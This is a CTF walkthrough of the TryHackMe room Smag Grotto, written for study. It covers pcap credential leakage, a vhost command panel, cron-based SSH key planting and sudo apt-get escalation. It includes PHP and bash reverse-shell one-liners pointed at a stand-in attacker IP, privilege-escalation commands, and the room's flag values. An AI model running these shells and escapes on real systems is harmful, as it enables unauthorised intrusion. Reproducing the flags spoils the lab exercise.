---
title: "Smag Grotto"
description: "A packet capture left on a mail page leaks the development vhost's credentials. The admin command box turns that into a shell, a world-writable SSH-key backup copied by root's cron hands over jake, and a passwordless apt-get rule finishes the box."
difficulty: "Easy"
tags: ["Packet Analysis", "Wireshark", "Virtual Hosts", "Command Injection", "Reverse Shells", "Cron Jobs", "SSH Keys", "Sudo", "GTFOBins", "Privilege Escalation", "Linux"]
date: "2026-07-17"
---

## Overview

Smag Grotto is a room about reading the evidence in front of you. The hint is a question — "Do you remember how to analyse packets?" — and the entire foothold depends on opening a packet capture that a developer left on a mail page. Everything else follows from what that capture says.

The path is short but has three distinct ideas. A hidden `/mail` directory contains a small `.pcap` of an internal login, and the capture leaks both a hostname (`development.smag.thm`) and a credential pair. That hostname is a virtual host with an admin panel that runs shell commands, which gives a shell as `www-data`. From there, a root-owned cron job copies a world-writable backup file over `jake`'s `authorized_keys` every minute, so writing your own public key into the backup is enough to become `jake`. Finally, `jake` may run `apt-get` as root without a password, and apt's pre-invoke hooks turn that into a root shell.

The two flags are plain 32-character strings rather than `THM{}` values, which is worth remembering when you are grepping for flags.

![Diagram of the Smag Grotto attack path: a leaked pcap, the development vhost, a command box, a cron key swap, and sudo apt-get](/assets/screenshots/smaggrotto/attack-chain.svg)

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Smag Grotto |
| Difficulty | Easy |
| Category | boot2root |
| Target | `10.48.181.2` (instance-specific) |
| Open ports (my scan) | 22, 80 |
| Operating system | Ubuntu 16.04 (Xenial) by version fingerprint; kernel 4.4.0-142 in the SSH banner |
| Skills | Packet analysis, virtual-host discovery, command execution, reverse shells, cron abuse, SSH key authentication, sudo/GTFOBins |
| User flag | `iusGorV7EbmxM5AuIe2w499msaSuqU3j` |
| Root flag | `uJr6zRgetaniyHVRqqL58uRasybBKz2T` |

My nmap scan was taken on 10 July 2026, and the remaining artifacts in the room folder — the key pair, the failed privilege-escalation attempt, and the reverse-shell payload — were written on 17 July 2026. The room folder has no `.completed` marker, so the date above reflects the working session rather than an official completion file.

A note on sources: the room folder contained the nmap and directory output, the downloaded pcap, an exported TCP stream, the generated SSH key pair, the public key that was written into the target, and the two privilege-escalation attempts. It contained no terminal screenshots. The terminal screenshots below come from published walkthroughs credited in the References section; the two diagrams are original to this post. Screenshots show the other authors' target IPs and keys, not mine. Where my own run did not preserve a terminal transcript, the output blocks below follow the sources credited in References and agree with the artifacts in the folder.

## Enumeration

### The Port Sweep

Service detection is enough to identify the stack:

```bash
nmap -sV -sC -oN nmap.txt 10.48.181.2
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Only two ports are open, and both versions point at Ubuntu 16.04: OpenSSH 7.2p2 with the `4ubuntu2.8` package suffix, and Apache 2.4.18. There is no outdated service with a convenient public exploit here. SSH needs credentials, and Apache is only useful if there is something to find behind it. The web server is the attack surface.

The page title is `Smag`, and the root document is a tiny placeholder. That is not much to work with, so the next question is whether the site has paths that are not linked from the home page.

### The Landing Page and /mail

Directory discovery finds one interesting path:

```bash
gobuster dir -u http://10.48.181.2 -w /usr/share/wordlists/dirb/common.txt
```

```text
.hta                 (Status: 403) [Size: 276]
.htaccess            (Status: 403) [Size: 276]
.htpasswd            (Status: 403) [Size: 276]
index.php            (Status: 200) [Size: 402]
mail                 (Status: 301) [Size: 309] [--> http://10.48.181.2/mail/]
server-status        (Status: 403) [Size: 276]
```

The `403`s are noise: Apache denies `.ht*` files and the server-status handler by default. The `301` on `/mail` is the interesting line. Apache is redirecting the request without a trailing slash to the directory with one, which means `/mail/` is a real directory rather than a rewrite or a soft 404.

Browsing to `http://10.48.181.2/mail/` shows three emails styled as a simple webmail archive. The thread is a short "Network Migration" conversation between two developers, and the last message points at a packet capture that was attached for review.

![The /mail page listing three emails, one of which carries a pcap attachment](/assets/screenshots/smaggrotto/mail-page.png)

The attachment link is not a normal filename:

```text
http://10.48.181.2/aW1wb3J0YW50/dHJhY2Uy.pcap
```

Those path components are base64:

```bash
echo aW1wb3J0YW50 | base64 -d   # important
echo dHJhY2Uy    | base64 -d   # trace2
```

So the real path is `/important/trace2.pcap`, with both the directory and the filename encoded. This is obfuscation, not protection: the link is right there on the page, and anyone who can read the HTML can decode it in one command. It keeps the file out of casual URL guessing and search-engine indexes, but it does not stop a person.

The file downloads fine:

```bash
wget http://10.48.181.2/aW1wb3J0YW50/dHJhY2Uy.pcap
file dHJhY2Uy.pcap
```

```text
dHJhY2Uy.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

The local copy kept the encoded filename. The decoded URL and the encoded filename on disk refer to the same file; the name does not matter once you know how to open it.

## The Packet Capture

A capture file is not just "network noise". In a CTF it is a recording of something a human did on the network, and humans type credentials. The room's question is a strong nudge to look at the conversation rather than the file size.

### Reading the Stream

The capture is tiny — ten frames in total, with one TCP conversation. In Wireshark, right-clicking any packet in that conversation and choosing **Follow → TCP Stream** reassembles it into readable text. The same thing can be done without a GUI:

```bash
capinfos dHJhY2Uy.pcap
tshark -r dHJhY2Uy.pcap -q -z follow,tcp,ascii,0
```

The reassembled stream is the key artifact:

```text
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0w
HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

![Follow TCP Stream view of the capture, showing the POST to development.smag.thm and the helpdesk credentials](/assets/screenshots/smaggrotto/wireshark-stream.png)

Three things matter in that request:

- The `Host` header is `development.smag.thm`. The request was sent to an IP address, but the application expected a different name. That is a virtual host, and it will not answer correctly unless the name is used.
- The body contains `username=helpdesk&password=cH4nG3M3_n0w`. These are web credentials, not SSH credentials — a distinction several walkthroughs run into when they try the pair on port 22 first.
- The `User-Agent` is `curl/7.47.0`, so this was a scripted or command-line login by someone who already knew the endpoint. The capture is a recording of an authenticated action, not a brute-force attempt.

The response is a bare `200 OK` with `Content-Length: 0`. That does not prove the login succeeded on its own, but the request is clearly a login attempt, and the next section uses the pair on the virtual host, which is the real test.

### What the Capture Actually Gives You

The important lesson is not "run strings on a pcap". It is that internal traffic records internal names and internal credentials, and a capture stored on a public web server is a disclosure. The developer captured a login to a development host, put the file in a mail attachment, and left the mail archive reachable from the internet. The capture was probably never meant to leave the internal network.

Base64 in the path, a non-linked directory, and a mail UI are all presentation. The contents are plain HTTP.

## The Hidden Virtual Host

Apache decides which site to serve from the `Host` header. The default site answers to the IP address; the development site answers to `development.smag.thm`. There is no DNS record for that name on the attacker's machine, so add one locally:

```bash
echo "10.48.181.2 development.smag.thm" | sudo tee -a /etc/hosts
getent hosts development.smag.thm
```

`/etc/hosts` is consulted before DNS, so this makes the name resolve to the target without changing anything on the server. From here, `http://development.smag.thm/` reaches the same Apache instance but a different virtual host.

The vhost serves a login form at `/login.php`:

![The login form served by the development.smag.thm virtual host](/assets/screenshots/smaggrotto/development-login.png)

The credentials from the capture work:

```text
Username: helpdesk
Password: cH4nG3M3_n0w
```

After authentication, the application redirects to `/admin.php`. The page is a deliberately simple administration panel with a field for a command and a button to run it. That is the vulnerability: the application takes a string from an HTTP form and passes it to a shell on the server. There is no injection trick to find, no filter to bypass — the feature *is* command execution, and the lab expects you to use it.

![admin.php after login: a web form that runs shell commands as www-data](/assets/screenshots/smaggrotto/admin-command-panel.png)

## Initial Access: The Command Box

The first useful check is to confirm who the web server runs as:

```bash
id
```

The command executes, but the page does not reliably print the result. Some published walkthroughs note that entering a command appears to do nothing, and the `200` response is often empty even when the command ran. That is a common property of naive PHP command handlers: they may call `exec()` and forget to echo the output, or only capture the last line. The execution still happens.

Because the output channel is unreliable, the practical move is to skip command output and open a reverse shell. A listener goes on the attacker machine:

```bash
rlwrap nc -nlvp 1234
```

Then the command field gets a PHP one-liner. This is the exact payload saved in the room folder's `init_webshell` file, with `10.0.0.1` standing in for the attacker's VPN IP and `1234` for the chosen port:

```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

The payload has three parts:

- `fsockopen()` opens a TCP connection back to the listener and returns a stream.
- The stream's underlying file descriptor is `3` (descriptors 0, 1, and 2 are already stdin, stdout, and stderr), so `<&3 >&3 2>&3` points the new shell's standard streams at the socket.
- `exec("/bin/sh -i ...")` launches the shell as a child of PHP and waits for it. Because the child's standard streams point at the socket, the shell is interactive while the PHP request stays blocked in the background; when the shell exits, PHP returns and the request finishes.

The listener catches the connection:

```text
listening on [any] 1234 ...
connect to [10.0.0.1] from (UNKNOWN) [10.48.181.2] 49492
/bin/sh: 0: can't access tty; job control turned off
$
```

The "can't access tty" message is expected. `nc` gives the shell a pipe, not a terminal, so job control and interactive prompts do not work properly. Allocate a pseudo-terminal:

```bash
SHELL=/bin/bash script -q /dev/null
```

`script` starts a new session with a pty and runs the shell inside it. The prompt becomes usable, arrow keys and `sudo` behave, and the shell is easier to work with. Confirm the identity and location:

```bash
id
hostname
pwd
```

The web application runs as `www-data`, and its document root is `/var/www/development.smag.thm`. That is enough for a foothold; the flags are not there.

If PHP CLI were unavailable, the same result is possible with bash's TCP redirection:

```bash
bash -c 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'
```

The principle is identical: the web form already runs shell commands, so any command that produces an outbound connection is a shell.

## Lateral Movement: www-data → jake

The home directory has one user:

```bash
ls -la /home
```

```text
drwxr-xr-x  4 jake jake 4096 Jun  5 11:05 jake
```

`jake`'s home contains `user.txt`, but it is not readable by `www-data`:

```bash
cat /home/jake/user.txt
```

```text
cat: /home/jake/user.txt: Permission denied
```

The file is `-rw-rw----` and owned by `jake:jake`. `www-data` is neither the owner nor in the `jake` group, so the read fails. The question is how to become `jake` without a password.

### The Cron Entry

Scheduled tasks are the first place to look after landing on a Linux host, because they often run as a more privileged user and often read files from predictable locations:

```bash
cat /etc/crontab
```

```text
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

The last line is not part of the operating system's default schedule. Every minute, as `root`, it cats a backup of a public key into `jake`'s `authorized_keys`. The name and location suggest that an administrator kept a copy of `jake`'s public key so it could be restored after a rebuild or a mistake. Re-applying it every minute makes the configuration "self-healing".

There is a flaw in that design, and it is not subtle:

```bash
ls -l /opt/.backups/jake_id_rsa.pub.backup
```

```text
-rw-rw-rw- 1 root root 563 Jun  5 09:25 /opt/.backups/jake_id_rsa.pub.backup
```

The source file is world-writable. Its owner is `root`, but the mode is `666`, so any local user — including `www-data` — can replace its contents. The cron job then runs as `root` and copies whatever is in that file into a file that controls who may log in as `jake`.

![The crontab entry that copies the backup into jake's authorized_keys every minute](/assets/screenshots/smaggrotto/cron-job.png)

This is the whole privilege boundary in one line. The job has two properties that combine badly:

- **It runs as root**, so it can write inside `/home/jake/.ssh`, which is mode `700` and owned by `jake`. `www-data` cannot write there directly.
- **It trusts a world-writable source.** The redirect `>` truncates `authorized_keys` first, so the result is exactly the contents of the backup file. If an attacker writes their public key into the backup, the attacker's key becomes the only authorized key.

A backup is supposed to be a known-good copy. Here it is a copy that any local user can edit, and a privileged process treats it as authoritative.

![Diagram of the cron key swap: a world-writable backup is copied over jake's authorized_keys by a root cron job](/assets/screenshots/smaggrotto/cron-key-swap.svg)

### The Key Swap

Generate a key pair on the attacker machine:

```bash
ssh-keygen -t ed25519 -f ctf_jake -C "shannu@kali"
```

That produces `ctf_jake` (the private key, which never leaves the attacker) and `ctf_jake.pub` (the public key, which is safe to copy anywhere). The room folder retains both files, plus a 564-byte `pub.backup` holding an attacker-generated RSA public key (`kali@kali`) of the kind used against this cron job. The 563-byte size reported on the target and the 564-byte local copy differ by a trailing newline, which is what you would expect after overwriting the file with an `echo` or a heredoc.

Only the public key goes to the target. The simplest method is to paste it into the `www-data` shell:

```bash
cat > /opt/.backups/jake_id_rsa.pub.backup <<'EOF'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... shannu@kali
EOF
```

The ellipsis stands for the real contents of `ctf_jake.pub`. If the shell is awkward for a long paste, host the public key on an attacker HTTP server and `curl` it, or use `echo` with the full line. The key is public, so there is no confidentiality problem with either method. The private key must stay on the attacker machine.

Then wait for the next minute boundary and log in:

```bash
chmod 600 ctf_jake
ssh -i ctf_jake jake@10.48.181.2
```

```text
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
...
jake@smag:~$
```

`chmod 600` is not optional in practice: OpenSSH refuses to use a private key that other users can read, and the key created by `ssh-keygen` is already `600`, but copying it between machines or restoring it from a backup can change that.

The cron uses `>` rather than `>>`, so overwriting the backup is enough. Appending would also work — the next run would copy both the original key and the attacker's key — but overwriting is more predictable and does not depend on the original file staying intact.

![SSH login as jake using the key planted through the cron job](/assets/screenshots/smaggrotto/jake-ssh-user-flag.png)

Read the user flag:

```bash
cat ~/user.txt
```

```text
iusGorV7EbmxM5AuIe2w499msaSuqU3j
```

There was no password to crack and no exploit against `sshd`. The authentication decision was delegated to a file that an unprivileged user could rewrite, and a root process copied it into place.

## Privilege Escalation: sudo apt-get

The first command after landing as any new user is the sudo inventory:

```bash
sudo -l
```

```text
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

`jake` may run `/usr/bin/apt-get` as any user, including `root`, without a password. The rule looks narrower than `ALL`, but only on paper. Sudo matches the program path; it does not, by default, restrict the arguments. If you can run `apt-get` with arbitrary arguments, you can make apt run arbitrary commands.

### Why apt-get Is a Shell

`apt-get` is a package manager, but it is also a framework that runs hooks. Two options matter here:

- `APT::Update::Pre-Invoke` is a command apt runs before starting an update.
- `Dpkg::Pre-Invoke` is a command dpkg runs before a package operation.

Both hooks are executed by the process that runs apt. When sudo runs `/usr/bin/apt-get` as root, the hook inherits root. GTFOBins documents this as a standard sudo escape for `apt-get`:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

The `-o` flag sets a configuration option for this invocation only. `APT::Update::Pre-Invoke::` names the hook, and `/bin/sh` is the command. `apt-get update` does not need to install anything, and the hook fires before apt contacts a repository — which is why the technique works even when the target has no internet access or the configured mirrors are dead.

The room folder records two attempts. The first was a configuration-file approach:

```bash
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > /tmp/apt.conf
sudo apt-get -y install -c /tmp/apt.conf sl
```

That one did not produce a shell in my run. The exact reason depends on how the installed apt and dpkg versions parse the configuration and whether `sl` can be resolved from a repository, but the practical lesson is that this variant is less reliable than the direct command-line option. The second attempt did work:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

A root shell follows:

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

The shell inherits the terminal from apt, so it behaves like a normal interactive shell. Using `/bin/bash` instead of `/bin/sh` gives a more familiar prompt and readline behaviour, and is equally valid:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
```

Then read the root flag:

```bash
cd /root
cat root.txt
```

```text
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```

![A root shell after the apt-get hook, with the root flag](/assets/screenshots/smaggrotto/root-flag.png)

The root flag file is `-rw-rw---- root root`, so a normal user cannot read it even if they find it. The shell, not the file location, is the obstacle.

The fix on a real system is not "remove apt-get from sudoers" in isolation; it is to avoid granting package managers to unprivileged users at all, and if a narrow delegation is genuinely needed, to wrap it in a root-owned script that pins the exact subcommand and arguments. A sudo rule that allows `apt-get` with any arguments is equivalent to `ALL`.

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/jake/user.txt` | `iusGorV7EbmxM5AuIe2w499msaSuqU3j` |
| Root | `/root/root.txt` | `uJr6zRgetaniyHVRqqL58uRasybBKz2T` |

Neither value uses the `THM{}` wrapper. Both are static across independent writeups of the room and are reproduced consistently in the sources listed below.

## Commands Used

| Purpose | Command |
|---------|---------|
| Service scan | `nmap -sV -sC -oN nmap.txt 10.48.181.2` |
| Directory discovery | `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt` |
| Decode the attachment path | `echo aW1wb3J0YW50 \| base64 -d` |
| Download the capture | `wget http://TARGET/aW1wb3J0YW50/dHJhY2Uy.pcap` |
| Inspect the capture | `capinfos dHJhY2Uy.pcap` |
| Reassemble the TCP stream | `tshark -r dHJhY2Uy.pcap -q -z follow,tcp,ascii,0` |
| Add the virtual host | `echo "TARGET development.smag.thm" \| sudo tee -a /etc/hosts` |
| Listener | `rlwrap nc -nlvp 1234` |
| Reverse shell from the admin form | `php -r '$sock=fsockopen("ATTACKER",1234);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| Upgrade the shell | `SHELL=/bin/bash script -q /dev/null` |
| Enumerate users | `ls -la /home` |
| Read the scheduled tasks | `cat /etc/crontab` |
| Check the backup permissions | `ls -l /opt/.backups/jake_id_rsa.pub.backup` |
| Generate a key pair | `ssh-keygen -t ed25519 -f ctf_jake -C "shannu@kali"` |
| Plant the public key | `cat > /opt/.backups/jake_id_rsa.pub.backup <<'EOF' ... EOF` |
| Log in as jake | `ssh -i ctf_jake jake@TARGET` |
| Read the user flag | `cat ~/user.txt` |
| Enumerate sudo | `sudo -l` |
| Escalate with apt | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |
| Read the root flag | `cat /root/root.txt` |

## Lessons Learned

- **A packet capture is a credential store.** The pcap contained a hostname and a username/password pair in cleartext because the login was HTTP, not HTTPS. Captures stored on web servers, in tickets, or in mail attachments are disclosures even when the endpoint they describe is internal.
- **The `Host` header is part of the attack surface.** The target IP served a placeholder; the real application lived on a name that only existed in an internal request. Virtual-host discovery is not just a browser trick — it is why the same IP can behave differently for different users.
- **Base64 is encoding, not access control.** The attachment path hid `important/trace2.pcap`, but the link was public and the decoding took one command. Obfuscation delays discovery; it does not prevent it.
- **Command output is not the same as command execution.** The admin form ran commands but did not reliably display their output. When a handler is blind, use a side channel — a reverse shell, an outbound `curl`, or a file written under the web root — instead of assuming nothing happened.
- **File descriptor redirection is the core of a reverse shell.** `fsockopen()` gives a socket, `<&3 >&3 2>&3` points the shell at it, and `exec()` hands the process over. Once that pattern is familiar, most one-liner payloads become readable.
- **A privileged job that reads a writable file is a privilege escalation.** The cron entry ran as root and copied a world-writable backup into `authorized_keys`. The mode `666` on the source turned a backup into an attacker-controlled configuration file.
- **`authorized_keys` is a login boundary.** Writing a public key into that file is equivalent to setting a password, except it is quieter and does not require knowing the old one. Protect it as tightly as `/etc/shadow`.
- **Sudo rules match programs, not intentions.** `NOPASSWD: /usr/bin/apt-get` is not a narrow rule. Apt's hooks, pagers, and configuration options all provide ways to run commands, and GTFOBins documents them. Delegating a package manager to a non-root user is effectively delegating root.
- **`secure_path` is not a mitigation for this.** It limits the PATH used to locate binaries, but the hook is an absolute path chosen by the attacker and executed by an already-privileged process. The fix has to be at the sudoers level, not in the environment.

## References

- [TryHackMe — Smag Grotto](https://tryhackme.com/room/smaggrotto)
- [aldeid — TryHackMe Smag Grotto](https://www.aldeid.com/wiki/TryHackMe-Smag-Grotto)
- [Invent Your Shit — TryHackMe: Smag Grotto](https://inventyourshit.com/tryhackme-smag-grotto/)
- [Electronics Reference — TryHackMe Smag Grotto walkthrough and notes](https://electronicsreference.com/thm/smag-grotto-walkthrough-and-notes/)
- [Diogo Blog — Smag Grotto](https://www.diogoblog.com/smag-grotto)
- [Avishai Gonen — Smag Grotto writeup](https://avishaigonen123.github.io/CTF_writeups/tryhackme/SmagGrotto/)
- [GTFOBins — apt-get](https://gtfobins.github.io/gtfobins/apt-get/)
- [Wireshark User's Guide — Following TCP streams](https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html)
- [Ubuntu manpages — crontab(5)](https://manpages.ubuntu.com/manpages/xenial/man5/crontab.5.html)
- [Ubuntu manpages — apt-get(8)](https://manpages.ubuntu.com/manpages/xenial/man8/apt-get.8.html)

*The room folder contained the nmap and gobuster output, the downloaded pcap, the exported TCP stream, the key pair, the planted public key, and the privilege-escalation notes, but no terminal screenshots. The mail, Wireshark, admin-panel, crontab, SSH-login, and root-flag screenshots are from Avishai Gonen's walkthrough; the login-page screenshot is from Diogo Blog. Both are credited above. The attack-chain and cron-key-swap diagrams are original to this post. Target IPs, key material, and shell sessions in the screenshots differ from my run.*
